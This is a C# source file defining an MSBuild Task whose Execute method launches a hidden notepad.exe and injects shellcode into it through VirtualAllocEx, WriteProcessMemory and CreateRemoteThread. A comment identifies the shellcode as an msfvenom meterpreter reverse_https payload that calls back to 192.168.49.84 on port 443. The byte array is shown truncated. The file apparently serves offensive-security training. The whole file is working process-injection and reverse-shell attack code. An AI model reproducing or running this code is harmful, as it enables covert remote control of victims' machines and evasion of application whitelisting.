using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

namespace MSBuild 
{
    public class ClassExample : Task, ITask
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(
            uint processAccess, 
            bool bInheritHandle, 
            int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            byte[] lpBuffer, 
            Int32 nSize, 
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess, 
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress, 
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            IntPtr lpThreadId);
        
        public override bool Execute()
        {
            // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.84 LPORT=443 EXITFUNC=thread -e x86/shikata_ga_nai -f csharp
            byte[] buf = new byte[551] { 0x4a...,0x6a,0x3b,0x90,0x26,0xe3,0xae,0x96,0x95,0x04,0xfb };
            
	    // Get PID of notepad.exe for our user and get a handle on the remote process
	    ProcessStartInfo startInfo = new ProcessStartInfo("C:\\Windows\\SysWOW64\\notepad.exe");
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
	    Process notepadProcess = Process.Start(startInfo);
	    int iTargetPid = notepadProcess.Id;
            IntPtr pTargetProcessHandle = OpenProcess(0x001F0FFF, false, iTargetPid);

            // Allocate remote process memory
            IntPtr addr = VirtualAllocEx(pTargetProcessHandle, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Write buf to memory allocation
            IntPtr outSize;
            WriteProcessMemory(pTargetProcessHandle, addr, buf, buf.Length, out outSize);

            // Create a thread in the remote process and execute code in buf
            IntPtr hThread = CreateRemoteThread(pTargetProcessHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
	    return true;
        }
    }
}
